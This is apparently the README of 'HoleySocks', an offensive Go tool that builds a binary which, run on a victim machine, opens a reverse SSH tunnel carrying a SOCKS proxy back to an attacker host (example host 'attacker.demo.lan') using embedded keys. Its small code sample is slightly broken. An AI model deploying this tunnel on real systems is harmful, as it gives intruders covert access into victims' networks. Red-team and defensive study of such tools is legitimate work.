# HoleySocks

A cross-platform reverse socks proxy.


## Getting Started

### As a module

```go
import github.com/audibleblink/holeysocks/pkg/holeysocks

func main() {
	//error handling removed for brevity
	config := holeysocks.MainConfig{}
        configBytes, _ := ioutil.OpenFile("ssh.json")
        json.Unmarshal(configBytes, &config)
	
	sshKey, _ := ioutil.OpenFile("id_ed25519")
	config.SSH.SetKey(sshKey)
	holeysocks.ForwardService(config)
}
```

### As a standalone binary

It's required to embed all the parameters needed to start and forward the socks server with SSH.
Do this by creating `config/ssh.json` and using `make`

```bash
cat <<EOF > configs/ssh.json
{
  "ssh": {
    "username": "sshuser",
    "host": "attacker.demo.lan",
    "port": 22
  },
  "socks": { "remote": "127.0.0.1:1080" }
}
EOF

make
```
**CAUTION**
The generated private keys are embedded into the binary to allow for the reverse
port forwarding without interaction. Follow the instructions below.

Before running the generated binaries, you'll need a user on your attacking machine
for receiving the reverse ssh connection that forwards the socks proxy from the victim.

Once that user has been created, (with a homedir and /bin/false shell), append the generated
pubkey in your authorized_keys file on the attacking machine.

The Makefile should generate the needed commands and entry for you when you run `make`
